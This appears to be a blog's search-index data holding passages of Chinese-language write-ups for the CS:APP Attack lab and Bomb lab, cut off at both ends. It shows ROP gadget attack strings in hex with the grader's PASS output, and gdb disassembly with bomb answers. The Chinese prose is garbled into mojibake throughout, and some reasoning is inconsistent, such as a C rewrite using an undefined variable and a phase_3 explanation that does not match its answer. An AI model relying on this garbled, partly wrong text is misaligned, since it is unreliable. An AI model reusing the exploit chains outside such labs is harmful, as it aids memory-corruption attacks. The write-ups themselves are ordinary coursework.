æŒ‡ä»¤äº†ï¼Œéœ€è¦æŒ‡ä»¤ä¸ºã€‚ popq %rax movq %rax,%rdi ret æŸ¥æ‰¾å®˜æ–¹çš„ write upï¼Œå¾—çŸ¥å¯¹åº”æœºå™¨ç ï¼Œç„¶ååœ¨åœ¨ rtarget æ–‡ä»¶çš„åæ±‡ç¼–æ–‡ä»¶ä¸­åˆ©ç”¨ vim æŸ¥æ‰¾å¯¹åº”ä»£ç åœ°å€ã€‚å°†å…¶æ”¾å…¥æ”»å‡»å­—ç¬¦ä¸²ï¼Œå¾—åˆ°æ”»å‡»å­—ç¬¦ä¸²ä¸ºã€‚ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3c 18 40 00 00 00 00 00 /* popq rax */ 80 93 14 63 00 00 00 00 /* cookie */ 49 18 40 00 00 00 00 00 /* movq %rax,%rdi */ cc 16 40 00 00 00 00 00 /* touch2 */ è½¬æ¢è¾“å…¥è¿è¡Œ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase4 | ./rtarget Cookie: 0x63149380 Type string:Touch2!: You called touch2(0x63149380) Valid solution for level 2 with target rtarget PASS: Sent exploit string to server to be validated. NICE JOB! ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:3:1","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_5 æ­¤å…³ä¸º phase_3 çš„ ROP ç‰ˆæœ¬ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥æ‰¾ start_farm åˆ° end_farm ä¸­çš„ gadgetsï¼Œæ‹¼å‡‘å‡ºä»£ç å®ç° phase_3 ä¸­æ’å…¥ä»£ç çš„åŠŸèƒ½ã€‚è¿˜éœ€æ³¨æ„ï¼š 1.0x90 ä»£è¡¨ nopï¼Œé™¤äº†å°† pc åŠ  1 ä¹‹å¤–ä¸åšä»»ä½•äº‹ã€‚ 2.ä¸åˆ†åŒå­—èŠ‚æŒ‡ä»¤ï¼Œè®¾ç½®æ ‡å¿—ä½ï¼Œä¸æ”¹å˜å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨ã€‚ éœ€è¦çš„æŒ‡ä»¤æœ‰ movq %rsp,%rax movq %rax,%rdi popq %rax movl %eax,%ecx movl %ecx,%edx movl %edx,%esi lea(%rdi, %rsi, 1),%rax movq %rax,%rdi åˆ™æ”»å‡»å­—ç¬¦ä¸²ä¸º 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 bd 18 40 00 00 00 00 00 /* gadget1 */ 49 18 40 00 00 00 00 00 /* gadget2 */ 30 18 40 00 00 00 00 00 /* gadget3 */ 48 00 00 00 00 00 00 00 /* cookieå­—ç¬¦ä¸²åç§»é‡*/ 13 19 40 00 00 00 00 00 /* gadget4 */ ca 18 40 00 00 00 00 00 /* gadget5 */ b7 18 40 00 00 00 00 00 /* gadget6 */ 69 18 40 00 00 00 00 00 /* gadget7 */ 49 18 40 00 00 00 00 00 /* gadget8 */ a0 17 40 00 00 00 00 00 /* touch3åœ°å€ */ 36 33 31 34 39 33 38 30 /* cookieå­—ç¬¦ä¸² */ 00 è½¬æ¢æ–‡ä»¶è¿è¡Œ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase5 | ./rtarget Cookie: 0x63149380 Type string:Touch3!: You called touch3(\"63149380\") Valid solution for level 3 with target rtarget PASS: Sent exploit string to server to be validated. NICE JOB! ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:3:2","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"åˆ°æ­¤ä¸ºæ­¢ ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:4:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"å®éªŒæ­¥éª¤ ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"å‡†å¤‡å·¥ä½œ ä½¿ç”¨tar -vxfå°†ç‚¸å¼¹å‹ç¼©åŒ…è§£å‹,cd è¿›å…¥,å¯ä»¥ä» bomb.c ä¸­çœ‹å‡ºå®éªŒçš„ç”¨æ„ä»¥åŠç¨‹åºçš„å¤§è‡´ é€»è¾‘,bomb ä¸ºå¯æ‰§è¡Œç¨‹åº,ä½¿ç”¨ gdb è°ƒè¯•è¯¥ç¨‹åº. (gdb) b read_line Breakpoint 1 at 0x40155c (gdb) b explode_bomb Breakpoint 2 at 0x4014e4 ç»™ read_line å‡½æ•°æ‰“ä¸Šæ–­ç‚¹,ä»¥ä¾¿æ¯æ¬¡è¾“å…¥è¿è¡Œä¸€å…³.ç»™ explode_bomb æ‰“ä¸Šæ–­ç‚¹,ä»¥ä¾¿åœ¨ç‚¸å¼¹çˆ†ç‚¸ å‰å¯ä»¥å¤„ç†. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:1","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_1 è·å¾— phase_1 æ±‡ç¼–ä»£ç  (gdb) disas phase_1 Dump of assembler code for function phase_1: 0x0000000000400e80 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000400e84 \u003c+4\u003e: mov $0x4024a0,%esi 0x0000000000400e89 \u003c+9\u003e: callq 0x40127e \u003cstrings_not_equal\u003e 0x0000000000400e8e \u003c+14\u003e: test %eax,%eax 0x0000000000400e90 \u003c+16\u003e: je 0x400e97 \u003cphase_1+23\u003e 0x0000000000400e92 \u003c+18\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400e97 \u003c+23\u003e: add $0x8,%rsp 0x0000000000400e9b \u003c+27\u003e: retq End of assembler dump. å¯è§,æ­¤é¢˜æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸åœ°å€ 0x4024a0 å¤„å­—ç¬¦ä¸²æ¯”è¾ƒ,ä¸ç­‰åˆ™çˆ†ç‚¸.æŸ¥çœ‹è¯¥å­—ç¬¦ä¸². (gdb) x/s 0x4024a0 0x4024a0 \u003c__dso_handle+344\u003e: \"We have to stand with our North Korean allies.\" é‚£ä¹ˆç­”æ¡ˆæ˜¯ We have to stand with our North Korean allies. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:2","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_2 (gdb) disas phase_2 Dump of assembler code for function phase_2: 0x0000000000400e9c \u003c+0\u003e: push %rbp 0x0000000000400e9d \u003c+1\u003e: push %rbx 0x0000000000400e9e \u003c+2\u003e: sub $0x28,%rsp 0x0000000000400ea2 \u003c+6\u003e: mov %rsp,%rsi 0x0000000000400ea5 \u003c+9\u003e: callq 0x40151a \u003cread_six_numbers\u003e 0x0000000000400eaa \u003c+14\u003e: cmpl $0x1,(%rsp) 0x0000000000400eae \u003c+18\u003e: je 0x400ed0 \u003cphase_2+52\u003e 0x0000000000400eb0 \u003c+20\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400eb5 \u003c+25\u003e: jmp 0x400ed0 \u003cphase_2+52\u003e 0x0000000000400eb7 \u003c+27\u003e: mov -0x4(%rbx),%eax 0x0000000000400eba \u003c+30\u003e: add %eax,%eax 0x0000000000400ebc \u003c+32\u003e: cmp %eax,(%rbx) 0x0000000000400ebe \u003c+34\u003e: je 0x400ec5 \u003cphase_2+41\u003e 0x0000000000400ec0 \u003c+36\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400ec5 \u003c+41\u003e: add $0x4,%rbx 0x0000000000400ec9 \u003c+45\u003e: cmp %rbp,%rbx 0x0000000000400ecc \u003c+48\u003e: jne 0x400eb7 \u003cphase_2+27\u003e 0x0000000000400ece \u003c+50\u003e: jmp 0x400edc \u003cphase_2+64\u003e 0x0000000000400ed0 \u003c+52\u003e: lea 0x4(%rsp),%rbx 0x0000000000400ed5 \u003c+57\u003e: lea 0x18(%rsp),%rbp 0x0000000000400eda \u003c+62\u003e: jmp 0x400eb7 \u003cphase_2+27\u003e 0x0000000000400edc \u003c+64\u003e: add $0x28,%rsp ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000400ee0 \u003c+68\u003e: pop %rbx 0x0000000000400ee1 \u003c+69\u003e: pop %rbp 0x0000000000400ee2 \u003c+70\u003e: retq End of assembler dump. +3 å¤„å‘ç°åœ¨æ ˆä¸­å¼€è¾Ÿäº† 0x28 çš„å†…å­˜åŒºåŸŸ.ç„¶åå°†%rsp çš„å€¼ä¼ ç»™%rsi ä½œä¸º å‚æ•°ä¼ ç»™å‡½æ•° read_six_numbers,å¯ä»¥çœ‹å‡ºåº”è¯¥ä½¿ç”¨å¼€è¾Ÿçš„ç©ºé—²å†…å­˜åš æ•°ç»„,è®°æ•°ç»„ä¸º r,è¯»å–å…­ä¸ªæ•°å­—.å°†(%rsp)å’Œ 0x1 æ¯”è¾ƒ,å¦‚æœä¸ç­‰,å°±ä¼šçˆ† ç‚¸,(ï¼…rsp)ä¸ºæ•°ç»„é¦–å…ƒ,æ•… r[0]ï¼ï¼‘;è·³è½¬åˆ°+52,å°† r[1]åœ°å€èµ‹ç»™%rbx, å°† r6åœ°å€èµ‹ç»™%rbp,è·³åˆ°+27,å°†%eax è®¾ä¸º%rbx æŒ‡å‘çš„å‰ä¸€ä¸ª æ•°,æ­¤æ—¶ä¸º r[0],æ¯”è¾ƒ r[1]å’Œ 2*r[0]æ˜¯å¦ç›¸ç­‰,ä¸ç­‰åˆ™çˆ†ç‚¸.è·³è½¬åˆ°+41,ï¼… rbx+4,æ¯”è¾ƒ%rbx å’Œ%rbp,ä¸ç­‰è·³è½¬åˆ°+27,é‡å¤,ç­‰åˆ™è·³è½¬åˆ°+64 ç»“æŸ,æˆåŠŸ .å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ªç¯æ¯”è¾ƒ.ç­‰ä»·äºä¸‹é¢çš„ c è¯­ a è¨€ for(int *b = \u0026r[1]; b != \u0026r[6]; b++) { if(*b != 2 * (*(b - 1))) call explode_bomb; æ•…ç­”æ¡ˆåº”è¯¥ä¸º 1 2 4 8 16 32. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:3","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_3 0x0000000000400ef1 \u003c+14\u003e: mov $0x4027cd,%esi 0x0000000000400ef6 \u003c+19\u003e: mov $0x0,%eax 0x0000000000400efb \u003c+24\u003e: callq 0x400ba0 \u003c__isoc99_sscanf@plt\u003e 0x0000000000400f00 \u003c+29\u003e: cmp $0x1,%eax æŸ¥çœ‹ 0x4027cd, (gdb) x/s 0x4027cd 0x4027cd: \"%d %d\" å¯çŸ¥,åº”è¯¥æ˜¯è¯»å…¥äº†ä¸¤ä¸ªæ•´æ•°. 0x0000000000400f15 \u003c+50\u003e: jmpq *0x402500(,%rax,8) 0x0000000000400f1c \u003c+57\u003e: mov $0x0,%eax 0x0000000000400f21 \u003c+62\u003e: jmp 0x400f28 \u003cphase_3+69\u003e 0x0000000000400f23 \u003c+64\u003e: mov $0x19c,%eax 0x0000000000400f28 \u003c+69\u003e: sub $0xcd,%eax 0x0000000000400f2d \u003c+74\u003e: jmp 0x400f34 \u003cphase_3+81\u003e 0x0000000000400f2f \u003c+76\u003e: mov $0x0,%eax 0x0000000000400f34 \u003c+81\u003e: add $0x29b,%eax 0x0000000000400f39 \u003c+86\u003e: jmp 0x400f40 \u003cphase_3+93\u003e 0x0000000000400f3b \u003c+88\u003e: mov $0x0,%eax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000400f40 \u003c+93\u003e: sub $0x36f,%eax 0x0000000000400f45 \u003c+98\u003e: jmp 0x400f4c \u003cphase_3+105\u003e 0x0000000000400f47 \u003c+100\u003e: mov $0x0,%eax 0x0000000000400f4c \u003c+105\u003e: add $0x36f,%eax 0x0000000000400f51 \u003c+110\u003e: jmp 0x400f58 \u003cphase_3+117\u003e 0x0000000000400f53 \u003c+112\u003e: mov $0x0,%eax 0x0000000000400f58 \u003c+117\u003e: sub $0x36f,%eax 0x0000000000400f5d \u003c+122\u003e: jmp 0x400f64 \u003cphase_3+129\u003e 0x0000000000400f5f \u003c+124\u003e: mov $0x0,%eax 0x0000000000400f64 \u003c+129\u003e: add $0x36f,%eax 0x0000000000400f69 \u003c+134\u003e: jmp 0x400f70 \u003cphase_3+141\u003e 0x0000000000400f6b \u003c+136\u003e: mov $0x0,%eax 0x0000000000400f70 \u003c+141\u003e: sub $0x36f,%eax 0x0000000000400f75 \u003c+146\u003e: jmp 0x400f81 \u003cphase_3+158\u003e 0x0000000000400f77 \u003c+148\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400f7c \u003c+153\u003e: mov $0x0,%eax 0x0000000000400f81 \u003c+158\u003e: cmpl $0x5,0xc(%rsp) 0x0000000000400f86 \u003c+163\u003e: jg 0x400f8e \u003cphase_3+171\u003e 0x0000000000400f88 \u003c+165\u003e: cmp 0x8(%rsp),%eax 0x0000000000400f8c \u003c+169\u003e: je 0x400f93 \u003cphase_3+176\u003e 0x0000000000400f8e \u003c+171\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e ç”±è¿™æ®µæ±‡ç¼–ä»£ç å¯çŸ¥,è¿™æ˜¯ä¸€æ®µ switch è¯­å¥,ä½¿ç”¨è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸º key, ç»è¿‡å¯¹åº”è·³è½¬ä½ç½®çš„æ“ä½œååº”ä¸ç¬¬äºŒä¸ªæ•°ç›¸ç­‰. (gdb) p/x *ï¼ˆ0x402500 + 32ï¼‰ $1 = 0x400f47 é‚£ä¹ˆç¬¬ä¸€ä¸ªæ•°ä¸º 0 æ—¶,è·³è½¬åˆ° 0x400f23 å¤„,é‚£ä¹ˆç¬¬äºŒä¸ªæ•°åº”è¯¥ä¸ºæ­¤å¤„çš„ 0x0, æ•…ä¸€ç»„ç­”æ¡ˆä¸º 4 0; ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:4","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_4 (gdb) disas phase_4 Dump of assembler code for function phase_4: 0x0000000000400fd0 \u003c+0\u003e: sub $0x18,%rsp 0x0000000000400fd4 \u003c+4\u003e: lea 0xc(%rsp),%rcx 0x0000000000400fd9 \u003c+9\u003e: lea 0x8(%rsp),%rdx 0x0000000000400fde \u003c+14\u003e: mov $0x4027cd,%esi 0x0000000000400fe3 \u003c+19\u003e: mov $0x0,%eax 0x0000000000400fe8 \u003c+24\u003e: callq 0x400ba0 \u003c__isoc99_sscanf@plt\u003e 0x0000000000400fed \u003c+29\u003e: cmp $0x2,%eax 0x0000000000400ff0 \u003c+32\u003e: jne 0x400ffe \u003cphase_4+46\u003e 0x0000000000400ff2 \u003c+34\u003e: mov 0xc(%rsp),%eax 0x0000000000400ff6 \u003c+38\u003e: sub $0x2,%eax 0x0000000000400ff9 \u003c+41\u003e: cmp $0x2,%eax 0x0000000000400ffc \u003c+44\u003e: jbe 0x401003 \u003cphase_4+51\u003e 0x0000000000400ffe \u003c+46\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401003 \u003c+51\u003e: mov 0xc(%rsp),%esi 0x0000000000401007 \u003c+55\u003e: mov $0x9,%edi 0x000000000040100c \u003c+60\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000401011 \u003c+65\u003e: cmp 0x8(%rsp),%eax 0x0000000000401015 \u003c+69\u003e: je 0x40101c \u003cphase_4+76\u003e 0x0000000000401017 \u003c+71\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x000000000040101c \u003c+76\u003e: add $0x18,%rsp 0x0000000000401020 \u003c+80\u003e: retq End of assembler dump. ç”±ä»£ç æ˜“çŸ¥,phase_4 è¯»å…¥äº†ä¸¤ä¸ªæ•°,ç¬¬äºŒä¸ªæ•°åœ¨ 2-4 ä¹‹é—´,ç„¶åå°†ç¬¬äºŒä¸ªæ•°ä½œä¸º func4 çš„ç¬¬äºŒä¸ªå‚æ•°,func4 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 9,è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å¿…é¡»å’Œ func4 è¿”å›å€¼ç›¸ç­‰. (gdb) disas func4 Dump of assembler code for function func4: 0x0000000000400f98 \u003c+0\u003e: push %r12 0x0000000000400f9a \u003c+2\u003e: push %rbp 0x0000000000400f9b \u003c+3\u003e: push %rbx 0x0000000000400f9c \u003c+4\u003e: mov %edi,%ebx 0x0000000000400f9e \u003c+6\u003e: test %edi,%edi 0x0000000000400fa0 \u003c+8\u003e: jle 0x400fc6 \u003cfunc4+46\u003e 0x0000000000400fa2 \u003c+10\u003e: mov %esi,%ebp 0x0000000000400fa4 \u003c+12\u003e: mov %esi,%eax 0x0000000000400fa6 \u003c+14\u003e: cmp $0x1,%edi 0x0000000000400fa9 \u003c+17\u003e: je 0x400fcb \u003cfunc4+51\u003e 0x0000000000400fab \u003c+19\u003e: lea -0x1(%rdi),%edi 0x0000000000400fae \u003c+22\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000400fb3 \u003c+27\u003e: lea (%rax,%rbp,1),%r12d 0x0000000000400fb7 \u003c+31\u003e: lea -0x2(%rbx),%edi 0x0000000000400fba \u003c+34\u003e: mov %ebp,%esi 0x0000000000400fbc \u003c+36\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000400fc1 \u003c+41\u003e: add %r12d,%eax 0x0000000000400fc4 \u003c+44\u003e: jmp 0x400fcb \u003cfunc4+51\u003e 0x0000000000400fc6 \u003c+46\u003e: mov $0x0,%eax 0x0000000000400fcb \u003c+51\u003e: pop %rbx 0x0000000000400fcc \u003c+52\u003e: pop %rbp 0x0000000000400fcd \u003c+53\u003e: pop %r12 0x0000000000400fcf \u003c+55\u003e: retq End of assembler dump. æ­¤å‡½æ•°ç­‰ä»·äºä¸‹é¢çš„ c ä»£ç  int func4(int a, int b) { if(a \u003c= 0) return 0; if(a == 1) return b; return b + func4(a - 1, b) + func4(n - 2, b); } ç©·ä¸¾ 2-4 çš„å€¼å³å¯å¾—åˆ°ç­”æ¡ˆ,å–ç­”æ¡ˆä¸º 176 2 ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:5","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_5 (gdb) disas phase_5 Dump of assembler code for function phase_5: 0x0000000000401021 \u003c+0\u003e: push %rbx 0x0000000000401022 \u003c+1\u003e: mov %rdi,%rbx 0x0000000000401025 \u003c+4\u003e: callq 0x401261 \u003cstring_length\u003e 0x000000000040102a \u003c+9\u003e: cmp $0x6,%eax 0x000000000040102d \u003c+12\u003e: je 0x401034 \u003cphase_5+19\u003e 0x000000000040102f \u003c+14\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401034 \u003c+19\u003e: mov $0x0,%eax 0x0000000000401039 \u003c+24\u003e: mov $0x0,%edx 0x000000000040103e \u003c+29\u003e: movzbl (%rbx,%rax,1),%ecx 0x0000000000401042 \u003c+33\u003e: and $0xf,%ecx 0x0000000000401045 \u003c+36\u003e: add 0x402540(,%rcx,4),%edx 0x000000000040104c \u003c+43\u003e: add $0x1,%rax 0x0000000000401050 \u003c+47\u003e: cmp $0x6,%rax 0x0000000000401054 \u003c+51\u003e: jne 0x40103e \u003cphase_5+29\u003e 0x0000000000401056 \u003c+53\u003e: cmp $0x27,%edx 0x0000000000401059 \u003c+56\u003e: je 0x401060 \u003cphase_5+63\u003e 0x000000000040105b \u003c+58\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401060 \u003c+63\u003e: pop %rbx 0x0000000000401061 \u003c+64\u003e: retq End of assembler dump. ç”±æ±‡ç¼–ä»£ç å¯çŸ¥,éœ€è¦è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º 6 çš„å­—ç¬¦ä¸².ä»¤è¯¥å­—ç¬¦ä¸²ä¸º input,+36 å¤„å‡ºç°çš„ æ•°ç»„ä¸º array,åˆ™è¯¥æ±‡ç¼–ç­‰ä»·äºä¸‹é¢ä»£ç . for(int i = 0; i \u003c 6; i++) sum += array[ input[i] \u0026 0xf ]; æ„ä¸ºéå†è¾“å…¥å­—ç¬¦ä¸²,å–è¯¥å­—ç¬¦ä¸²ä½ 4 ä½ä½œä¸º array ä¸‹æ ‡,å–å‡º array å€¼ç›¸åŠ . æŸ¥çœ‹ array çš„å€¼ (gdb) p/x *0x402540@16 $2 = {0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, 0xf, 0xd} é¢˜ç›®è¦æ±‚ sum = 0x27,æ•…ä» array ä¸­é€‰å‡º 6 ä¸ªå’Œä¸º 0x27 çš„æ•°,é€šè¿‡è¿™ 6 ä¸ªæ•°çš„ä¸‹æ ‡æ‰¾å‡ºå¯¹åº”å­—ç¬¦. ç­”æ¡ˆåº”ä¸º 01347L; ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:6","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_6 å› ä¸ºè¯¾ç¨‹æœªå¯¹åç»­ä¸¤å…³ä½œè¦æ±‚,æ•…ä¸åšç‰¹åˆ«è¯¦ç»†çš„è§£ç­”. (gdb) disas phase_6 Dump of assembler code for function phase_6: 0x0000000000401062 \u003c+0\u003e: push %r13 0x0000000000401064 \u003c+2\u003e: push %r12 0x0000000000401066 \u003c+4\u003e: push %rbp 0x0000000000401067 \u003c+5\u003e: push %rbx 0x0000000000401068 \u003c+6\u003e: sub $0x58,%rsp 0x000000000040106c \u003c+10\u003e: lea 0x30(%rsp),%rsi 0x0000000000401071 \u003c+15\u003e: callq 0x40151a \u003cread_six_numbers\u003e 0x0000000000401076 \u003c+20\u003e: lea 0x30(%rsp),%r13 0x000000000040107b \u003c+25\u003e: mov $0x0,%r12d 0x0000000000401081 \u003c+31\u003e: mov %r13,%rbp 0x0000000000401084 \u003c+34\u003e: mov 0x0(%r13),%eax 0x0000000000401088 \u003c+38\u003e: sub $0x1,%eax 0x000000000040108b \u003c+41\u003e: cmp $0x5,%eax 0x000000000040108e \u003c+44\u003e: jbe 0x401095 \u003cphase_6+51\u003e 0x0000000000401090 \u003c+46\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401095 \u003c+51\u003e: add $0x1,%r12d 0x0000000000401099 \u003c+55\u003e: cmp $0x6,%r12d 0x000000000040109d \u003c+59\u003e: jne 0x4010a6 \u003cphase_6+68\u003e 0x000000000040109f \u003c+61\u003e: mov $0x0,%esi 0x00000000004010a4 \u003c+66\u003e: jmp 0x4010e8 \u003cphase_6+134\u003e 0x00000000004010a6 \u003c+68\u003e: mov %r12d,%ebx 0x00000000004010a9 \u003c+71\u003e: movslq %ebx,%rax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x00000000004010ac \u003c+74\u003e: mov 0x30(%rsp,%rax,4),%eax 0x00000000004010b0 \u003c+78\u003e: cmp %eax,0x0(%rbp) 0x00000000004010b3 \u003c+81\u003e: jne 0x4010ba \u003cphase_6+88\u003e 0x00000000004010b5 \u003c+83\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004010ba \u003c+88\u003e: add $0x1,%ebx 0x00000000004010bd \u003c+91\u003e: cmp $0x5,%ebx 0x00000000004010c0 \u003c+94\u003e: jle 0x4010a9 \u003cphase_6+71\u003e 0x00000000004010c2 \u003c+96\u003e: add $0x4,%r13 0x00000000004010c6 \u003c+100\u003e: jmp 0x401081 \u003cphase_6+31\u003e 0x00000000004010c8 \u003c+102\u003e: mov 0x8(%rdx),%rdx 0x00000000004010cc \u003c+106\u003e: add $0x1,%eax 0x00000000004010cf \u003c+109\u003e: cmp %ecx,%eax 0x00000000004010d1 \u003c+111\u003e: jne 0x4010c8 \u003cphase_6+102\u003e 0x00000000004010d3 \u003c+113\u003e: jmp 0x4010da \u003cphase_6+120\u003e 0x00000000004010d5 \u003c+115\u003e: mov $0x603410,%edx 0x00000000004010da \u003c+120\u003e: mov %rdx,(%rsp,%rsi,2) 0x00000000004010de \u003c+124\u003e: add $0x4,%rsi 0x00000000004010e2 \u003c+128\u003e: cmp $0x18,%rsi 0x00000000004010e6 \u003c+132\u003e: je 0x4010fd \u003cphase_6+155\u003e 0x00000000004010e8 \u003c+134\u003e: mov 0x30(%rsp,%rsi,1),%ecx 0x00000000004010ec \u003c+138\u003e: cmp $0x1,%ecx 0x00000000004010ef \u003c+141\u003e: jle 0x4010d5 \u003cphase_6+115\u003e 0x00000000004010f1 \u003c+143\u003e: mov $0x1,%eax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x00000000004010f6 \u003c+148\u003e: mov $0x603410,%edx 0x00000000004010fb \u003c+153\u003e: jmp 0x4010c8 \u003cphase_6+102\u003e 0x00000000004010fd \u003c+155\u003e: mov (%rsp),%rbx 0x0000000000401101 \u003c+159\u003e: lea 0x8(%rsp),%rax 0x0000000000401106 \u003c+164\u003e: lea 0x30(%rsp),%rsi 0x000000000040110b \u003c+169\u003e: mov %rbx,%rcx 0x000000000040110e \u003c+172\u003e: mov (%rax),%rdx 0x0000000000401111 \u003c+175\u003e: mov %rdx,0x8(%rcx) 0x0000000000401115 \u003c+179\u003e: add $0x8,%rax 0x0000000000401119 \u003c+183\u003e: cmp %rsi,%rax 0x000000000040111c \u003c+186\u003e: je 0x401123 \u003cphase_6+193\u003e 0x000000000040111e \u003c+188\u003e: mov %rdx,%rcx 0x0000000000401121 \u003c+191\u003e: jmp 0x40110e \u003cphase_6+172\u003e 0x0000000000401123 \u003c+193\u003e: movq $0x0,0x8(%rdx) 0x000000000040112b \u003c+201\u003e: mov $0x5,%ebp 0x0000000000401130 \u003c+206\u003e: mov 0x8(%rbx),%rax 0x0000000000401134 \u003c+210\u003e: mov (%rax),%eax 0x0000000000401136 \u003c+212\u003e: cmp %eax,(%rbx) 0x0000000000401138 \u003c+214\u003e: jge 0x40113f \u003cphase_6+221\u003e 0x000000000040113a \u003c+216\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x000000000040113f \u003c+221\u003e: mov 0x8(%rbx),%rbx 0x0000000000401143 \u003c+225\u003e: sub $0x1,%ebp 0x0000000000401146 \u003c+228\u003e: jne 0x401130 \u003cphase_6+206\u003e ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000401148 \u003c+230\u003e: add $0x58,%rsp 0x000000000040114c \u003c+234\u003e: pop %rbx 0x000000000040114d \u003c+235\u003e: pop %rbp 0x000000000040114e \u003c+236\u003e: pop %r12 0x0000000000401150 \u003c+238\u003e: pop %r13 0x0000000000401152 \u003c+240\u003e: retq End of assembler dump. æ±‡ç¼–ä»£ç å¾ˆé•¿.å…¶æ„ä¸ºè¾“å…¥ 6 ä¸ªäº’ä¸ç›¸ç­‰çš„æ•°,ä»‹äº 1-6.æŒ‰è¿™ 6 ä¸ªæ•°çš„å€¼ä»ä½äºåœ°å€ 0x603410 çš„é“¾è¡¨ä¸­é€‰å‡ºå¯¹åº”ä½ç½®çš„ èŠ‚ç‚¹æŒ‡é’ˆ,ç»„æˆä¸€ä¸ªæ•°ç»„.æŒ‰é€‰å‡ºçš„é¡ºåºå°†è¿™å…­ä¸ªèŠ‚ç‚¹ç»„æˆæ–°çš„é“¾è¡¨,ç„¶åæ£€æŸ¥è¿™ä¸ªé“¾è¡¨æ˜¯å¦ä¸ºé™åº. æŸ¥çœ‹é“¾è¡¨çš„å€¼. (gdb) p/x *(0x603410) $3 = 0x1cf (gdb) p/x *(0x603410 + 8) $4 = 0x603420 (gdb) p/x *(0x603420) $5 = 0x188 (gdb) p/x *(0x603420 + 8) $6 = 0x603430 (gdb) p/x *(0x603430) $7 = 0x1d1 (gdb) p/x *(0x603430 + 8) $8 = 0x603440 (gdb) p/x *(0x603440) $9 = 0x174 (gdb) p/x","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:7","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"secret_phase æ­£å¸¸é€šè¿‡å‰ 6 å…³æ˜¯æ— æ³•è§¦å‘ secret_phase 